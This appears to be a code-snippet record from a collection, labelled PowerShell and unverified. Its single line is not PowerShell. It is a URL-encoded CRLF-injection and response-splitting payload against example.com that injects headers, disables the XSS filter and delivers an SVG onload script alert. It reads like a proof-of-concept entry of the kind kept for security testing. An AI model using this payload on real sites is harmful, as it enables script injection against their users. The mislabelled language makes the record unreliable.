---
id: 8bb002b0-0f11-46e4-8293-b3ba1eaebced
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:54.882733+00:00'
updated_at: '2023-04-06T03:55:54.889827+00:00'
---

# Code Snippet 8bb002b0

**Language**: Powershell

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```


